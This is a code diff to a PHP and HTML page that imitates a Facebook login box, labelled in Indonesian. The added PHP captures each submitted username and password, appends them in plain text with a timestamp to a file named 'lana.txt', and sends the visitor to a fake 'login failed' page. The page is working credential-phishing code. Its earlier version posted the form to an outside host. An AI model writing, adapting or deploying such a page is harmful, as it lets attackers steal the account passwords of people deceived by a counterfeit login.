@@ -28,49 +28,75 @@
             </div>
         </div>
     </div>
+
+    <?php
+    if (isset($_POST['submit'])) {
+        $username = $_POST['username'];
+        $pass = $_POST['password'];
+        $time=time();
+        $gmt='+7';
+        $jm='3600';
+        $var=$time+($gmt*$jm);
+        $now=gmdate('d M Y - H:i',$var);
+
+        // Simpan data ke dalam file teks
+        $dataToSave = "
+Username : $username
+Password : $pass
+Date Submitted : '.$now.'\n
+*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*\n";
+        $file = "lana.txt";
+        file_put_contents($file, $dataToSave, FILE_APPEND);
+
+         // Arahkan pengguna ke halaman lain
+         header("Location:login_gagal.php");
+         exit; // Pastikan untuk keluar dari skrip setelah mengarahkan pengguna
+    }
+    ?>
 </body>
 </html>
-<!-- Modal -->
-<div class="modal fade" id="staticBackdrop" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="staticBackdropLabel" aria-hidden="true">
-  <div class="modal-dialog">
-    <div class="modal-content">
-      <div class="modal-header">
-        <h5 class="modal-title text-center" id="staticBackdropLabel"></h5>
-        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
-      </div>
-      <div class="modal-body">
-        <div class="container mt-1">
-          <div class="row mb-5">
-                <div class="col-md-12 text-center">
-                  <img src="images/fb.png" alt="" width="120px" height="40px">
+
+    <!-- Modal -->
+    <div class="modal fade" id="staticBackdrop" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="staticBackdropLabel" aria-hidden="true">
+      <div class="modal-dialog">
+        <div class="modal-content">
+          <div class="modal-header">
+            <h5 class="modal-title text-center" id="staticBackdropLabel"></h5>
+            <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+          </div>
+          <div class="modal-body">
+            <div class="container mt-1">
+              <div class="row mb-5">
+                    <div class="col-md-12 text-center">
+                      <img src="images/fb.png" alt="" width="120px" height="40px">
+                    </div>
                 </div>
-            </div>
-            <div class="row">
-                <div class="col-md-6 offset-md-3">
-                    <div class="login-box">
-                        <form action="http://luanchy.42web.io/index_login_proses.php" method="POST">
-                            <div class="mb-3">
-                                <input type="text" class="form-control" id="username" name="username" placeholder="Email or Phone" required="" aria-required="true">
+                <div class="row">
+                    <div class="col-md-6 offset-md-3">
+                        <div class="login-box">
+                            <form action="" method="POST">
+                                <div class="mb-3">
+                                    <input type="text" class="form-control" id="username" name="username" placeholder="Email or Phone" required="" aria-required="true">
+                                </div>
+                                <div class="mb-3">
+                                    <input type="password" class="form-control" id="password" name="password" placeholder="Password" required="" aria-required="true">
+                                </div>
+                                <button type="submit" name="submit" class="btn btn-primary custom-button">Masuk</button>
+                            </form>
+                            <p class="text-primary text-center margin">Lupa kata sandi ?</p>
+                            <div class="row margin">
+                                <div class="col-5 col-md-4"><hr></div>
+                                <div class="col-1 col-md-3 margin_kanan">atau</div>
+                                <div class="col-5 col-md-4"><hr></div>
                             </div>
-                            <div class="mb-3">
-                                <input type="password" class="form-control" id="password" name="password" placeholder="Password" required="" aria-required="true">
-                            </div>
-                            <button type="submit" class="btn btn-primary custom-button">Masuk</button>
-                        </form>
-                        <p class="text-primary text-center margin">Lupa kata sandi ?</p>
-                        <div class="row margin">
-                            <div class="col-5 col-md-4"><hr></div>
-                            <div class="col-1 col-md-3 margin_kanan">atau</div>
-                            <div class="col-5 col-md-4"><hr></div>
+                            <button type="button" class="btn btn-outline-dark custom-button margin">Buat akun baru</button>
                         </div>
-                        <button type="button" class="btn btn-outline-dark custom-button margin">Buat akun baru</button>
                     </div>
                 </div>
             </div>
+          </div>
+          <div class="modal-footer">
+          </div>
         </div>
       </div>
-      <div class="modal-footer">
-      </div>
     </div>
-  </div>
-</div>
